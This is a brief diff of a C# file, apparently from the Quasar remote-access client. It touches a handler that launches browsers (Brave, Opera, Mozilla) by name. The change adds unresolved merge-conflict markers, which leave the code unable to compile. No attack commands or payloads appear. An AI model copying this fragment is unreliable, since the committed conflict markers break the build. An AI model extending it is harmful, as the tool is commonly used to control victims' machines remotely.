@@ -285,6 +285,8 @@ namespace Quasar.Client.Messages
                 this.ProcessHandler.StartEdge();
                 return;
             }
+<<<<<<< HEAD
+=======
             if (name == "Brave")
             {
                 this.ProcessHandler.StartBrave();
@@ -295,6 +297,7 @@ namespace Quasar.Client.Messages
                 this.ProcessHandler.StartOpera();
                 return;
             }
+>>>>>>> d1562c487ffbb93b7d062a71485785771a87ce11
             if (!(name == "Mozilla"))
             {
                 return;
